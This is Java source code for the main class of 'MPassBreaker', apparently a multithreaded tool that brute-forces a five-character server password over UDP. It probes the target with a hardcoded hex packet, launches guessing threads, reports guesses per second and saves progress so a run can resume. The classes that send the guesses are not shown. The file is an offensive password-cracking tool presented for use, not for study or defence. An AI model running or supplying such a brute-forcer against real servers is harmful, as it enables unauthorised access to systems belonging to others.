package mpassbreaker;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import javax.xml.bind.DatatypeConverter;

public class MPassBreaker {

    public static int length = 5;
    public static String ip;
    public static int port;
    public static boolean broken = false;
    public static boolean save = false;
    public static int thread;
    public static Integer counter = 0;
    public static Integer continuation;
    public static Combination combination;

    public static void main(String[] args) throws InterruptedException {

        ip = args[0];
        System.out.println(ip);
        port = Integer.parseInt(args[1]);
        System.out.println(port);
        thread = Integer.parseInt(args[2]);
        System.out.println(thread);
        if (args.length > 3) {
            continuation = Integer.parseInt(args[3]);
            System.out.println(continuation);
        } else {
            continuation = 0;
        }

        int j = 0;
        while (!checkMap() && j < 3) {
            j++;
        }
        if (j >= 3) {
            System.out.println("Error: Server not responsing!");
            return;
        }
        else{
            System.out.println("Server responsing!");
        }
        if (continuation == 1) {
            combination = new Combination(1);
        } else {
            combination = new Combination();
        }
        combination.start();
        for (int i = 0; i < thread; i++) {
            BreakPass breakPass = new BreakPass();
            breakPass.start();
        }
        int speed;
        while (!save) {
            Thread.sleep(10000);
            synchronized (combination.lista) {
                synchronized (counter) {
                    speed = counter / 10;
                    counter = 0;
                }
                System.out.print("Remain: " + combination.lista.size() + " passwords, speed: " + speed + " pass/sec, ");
                System.out.println("Current password: " + combination.lista.get(0));

            }
        }
        Combination.saveClassFile(combination);
        
    }

    public static boolean checkMap() {
        try {
            String str = "deadbeefabababababababab0000000005abababbadeabee";
            byte[] buf = DatatypeConverter.parseHexBinary(str);
            InetAddress servAddr = InetAddress.getByName(ip);
            DatagramSocket socket = new DatagramSocket();
            DatagramPacket packet = null;
            socket.setSoTimeout(2000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende
            int map = packet.getData()[98];
            BreakPass.map5 = "0" + map + "000000";
        } catch (Exception ex) {
            return false;
        }
        return true;
    }
}
